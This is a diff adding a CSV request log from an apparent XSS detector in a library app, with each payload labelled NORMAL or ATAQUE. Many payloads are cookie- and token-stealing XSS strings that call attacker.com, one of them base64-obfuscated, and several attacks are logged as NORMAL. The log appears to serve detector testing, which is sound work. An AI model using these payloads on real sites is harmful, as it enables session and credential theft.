@@ -1,0 +1,34 @@
+﻿Data/Hora,IP,Payload,Classificacao,Confianca
+2026-05-06T17:30:37.233-03:00,0:0:0:0:0:0:0:1,"{""email"":""nicolasjdc55@gmail.com"",""password"":""1234""}",NORMAL,0.0%
+2026-05-06T17:31:13.451-03:00,0:0:0:0:0:0:0:1,"{""dataDeEntrega"":""2026-05-06""}",NORMAL,0.0%
+2026-05-06T17:32:17.103-03:00,0:0:0:0:0:0:0:1,"{""nome"":""Erin Silva"",""email"":""erin.silva@gmail.com"",""telefone"":""11987653214"",""dataDeNascimento"":""2025-10-26"",""perfil"":""USUARIO""}",NORMAL,0.0%
+2026-05-06T17:32:34.586-03:00,0:0:0:0:0:0:0:1,"{""nome"":""Nicolas Jos�"",""email"":""nicolas@email.com.br"",""telefone"":""1199999999"",""dataDeNascimento"":""2004-11-04"",""perfil"":""USUARIO""}",NORMAL,0.0%
+2026-05-06T17:33:52.972-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<img src=\""x\"" onerror=\""new Image().src='http://attacker.com/log?c='+document.cookie\"">"",""autor"":""Autor"",""genero"":{""id"":2}}",ATAQUE,85.0%
+2026-05-06T17:50:32.524-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<script>navigator.sendBeacon('http://attacker.com/log', document.cookie)</script>""}",ATAQUE,85.0%
+2026-05-06T17:51:41.120-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<script>localStorage.getItem('token')</script>""}",ATAQUE,85.0%
+2026-05-06T17:54:56.090-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<img src=x onerror=\""alert(localStorage.getItem('token'))\"">"",""autor"":""<img src=x onerror=\""alert(localStorage.getItem('token'))\"">"",""genero"":{""id"":14}}",ATAQUE,85.0%
+2026-05-06T17:58:37.229-03:00,0:0:0:0:0:0:0:1,"{""email"":""nicolasjdc55@gmail.com"",""password"":""1234""}",NORMAL,0.0%
+2026-05-06T17:58:45.299-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<img src=x onerror=\""eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20/Yz0nK2RvY3VtZW50LmNvb2tpZSk='))\"">"",""autor"":""1234"",""genero"":{""id"":1}}",ATAQUE,85.0%
+2026-05-06T17:59:41.029-03:00,0:0:0:0:0:0:0:1,"{""nome"":""autofocus onfocus=\""fetch('http://attacker.com?c='+document.cookie)"",""email"":""gabriel@usuario.com.br"",""telefone"":""999999999"",""dataDeNascimento"":""1965-11-04"",""perfil"":""BIBLIOTECARIO""}",NORMAL,5.0%
+2026-05-06T18:00:10.290-03:00,0:0:0:0:0:0:0:1,"{""nome"":""Livro"",""autor"":""Autor"",""disponibilidade"":""DISPONIVEL"",""genero"":{""id"":8}}",NORMAL,0.0%
+2026-05-06T18:00:51.448-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<script>fetch('/api/livros/delete/1')</script>""}",ATAQUE,85.0%
+2026-05-06T18:01:25.708-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<img src=x onerror=\""alert('XSS')\"">"",""autor"":""<img src=x onerror=\""alert(localStorage.getItem('token'))\"">"",""disponibilidade"":""DISPONIVEL"",""genero"":{""id"":14}}",ATAQUE,85.0%
+2026-05-06T18:03:37.931-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<img src=x onerror=\""alert('XSS')\"">"",""autor"":""1234"",""genero"":{""id"":4}}",ATAQUE,85.0%
+2026-05-06T18:03:54.293-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<script>fetch('http://attacker.com?token='+localStorage.getItem('token'))</script>"",""autor"":""<img src=x onerror=\""alert(localStorage.getItem('token'))\"">"",""disponibilidade"":""DISPONIVEL"",""genero"":{""id"":14}}",ATAQUE,85.0%
+2026-05-06T18:04:17.720-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<svg onload=fetch('http://attacker.com?c='+document.cookie)>""}",NORMAL,10.0%
+2026-05-06T18:04:28.868-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>""}",ATAQUE,85.0%
+2026-05-06T18:04:32.651-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>""}",ATAQUE,85.0%
+2026-05-06T18:04:53.918-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>""}",ATAQUE,85.0%
+2026-05-06T18:05:21.630-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>"",""autor"":""<img src=x onerror=...>"",""genero"":{""id"":8}}",ATAQUE,85.0%
+2026-05-06T18:06:12.527-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<script>alert(Voce Ganhou um Premio)</script>""}",ATAQUE,85.0%
+2026-05-06T18:10:12.552-03:00,0:0:0:0:0:0:0:1,"{""nome"":""Fantasia""}",NORMAL,0.0%
+2026-05-06T18:10:13.661-03:00,0:0:0:0:0:0:0:1,"{""nome"":""Amanda"",""email"":""amanda@email.com""}",NORMAL,0.0%
+2026-05-06T18:10:15.921-03:00,0:0:0:0:0:0:0:1,"{""titulo"":""Java Efetivo""}",NORMAL,0.0%
+2026-05-06T18:10:16.912-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<script>alert('teste')</script>""}",ATAQUE,85.0%
+2026-05-06T18:10:18.012-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<img src=x onerror=alert('xss')>"",""email"":""xss@email.com""}",ATAQUE,85.0%
+2026-05-06T18:10:20.337-03:00,0:0:0:0:0:0:0:1,"{""titulo"":""<svg onload=alert('xss')>"",""autor"":""Anon""}",NORMAL,10.0%
+2026-05-06T18:10:21.712-03:00,0:0:0:0:0:0:0:1,"{""nome"":""Drama""}",NORMAL,0.0%
+2026-05-06T18:10:22.144-03:00,0:0:0:0:0:0:0:1,"{""titulo"":""1984"",""autor"":""George Orwell""}",NORMAL,0.0%
+2026-05-06T18:10:22.811-03:00,0:0:0:0:0:0:0:1,"{""texto"":""<body onload=alert('comentario')>""}",NORMAL,10.0%
+2026-05-06T18:10:24.119-03:00,0:0:0:0:0:0:0:1,"{""nome"":""Fernanda"",""email"":""fernanda@email.com""}",NORMAL,0.0%
+2026-05-06T18:10:25.004-03:00,0:0:0:0:0:0:0:1,"{""nome"":""<iframe src='javascript:alert(1)'></iframe>""}",ATAQUE,85.0%
